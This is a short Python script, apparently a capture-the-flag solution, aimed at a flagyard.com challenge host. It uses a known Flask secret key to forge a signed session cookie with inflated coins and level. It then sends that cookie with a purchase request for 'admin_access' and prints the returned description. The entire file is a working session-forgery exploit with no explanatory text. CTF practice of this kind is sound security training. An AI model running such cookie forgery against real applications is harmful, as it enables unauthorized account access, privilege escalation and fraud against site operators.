from flask import Flask
import requests

HOST = "http://ejb2m3ixbg-0.playat.flagyard.com"

session_payload = {
    'user': 'z0v3r1n',
    'coins': 5000,
    'level': 99,
    'xp': 999999,
    'inventory': [],
    'used_bonus': False,
    'achievements': [],
    'last_daily_claim': None
}

app = Flask(__name__)
app.secret_key = "verysecurekeythatwenevergetto"
cookie_value = app.session_interface.get_signing_serializer(app).dumps(session_payload)

print(requests.post("http://ejb2m3ixbg-0.playat.flagyard.com/api/premium/purchase", json={"cart": [{"service_id": "admin_access", "quantity": 1}], "apply_bonus": False}, cookies={"session": cookie_value}, timeout=10).json()['services'][0]['description'])
